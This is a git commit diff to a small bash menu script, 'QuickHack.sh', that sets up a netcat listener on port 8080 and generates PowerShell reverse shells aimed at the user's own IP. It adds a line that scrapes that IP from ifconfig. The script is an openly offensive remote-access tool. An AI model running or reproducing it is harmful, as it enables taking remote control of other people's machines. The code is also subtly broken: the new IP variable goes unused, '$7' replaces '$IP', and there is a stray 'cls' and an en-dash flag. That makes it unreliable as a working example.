14b73e7e92c5cd43540069f1bdfa019cb1f72a25
chill-c0der <99861040+chill-c0der2@users.noreply.github.com>
2022-12-05 15:03:12 -0800

    Update QuickHack.sh

--- QuickHack.sh
+++ QuickHack.sh
@@ -1,4 +1,5 @@
 cls
+ip=`ifconfig|xargs|awk '{print $7}'|sed -e 's/[a-z]*:/''/'`
 base64 -d <<<"ICAoKCAgICAoICAgICAoICAoICAgKCAoICAgKCAgICggICggICAKICApKVwgICApXCAgKCAoXCApXCAgKVwpXDogKVwgIChcIClcICAKICgoXykpICgoXykgKVwoXCgoXykoXykoXykoXygpIChcKChfKSAKKC8gXyBcKChfKSkoXykoICkgfF9fIHx8IHwoXykoKSggKSB8X18KfCAoXykgfCB8fCB8IHwgX3wgLyAvIF9fIHwgX2AgfCBffCAvIC8KIFxfX1xfXFxfLl98X3xfX3xfXF9cX3x8X3xfXy9ffF9ffF9cX1wK"
 PS3='linux@QuickHack '
 options=("Setup Listner" "Reverse Shell Generator" "Quit")
@@ -9,7 +10,7 @@ do
             nc –lvnp 8080
             ;;
         "Reverse Shell Generator")
-            bash shelly.sh -h $IP -p 8080 -l powershell
+            bash shelly.sh -h $7 -p 8080 -l powershell
             ;;
         "Quit")
             break
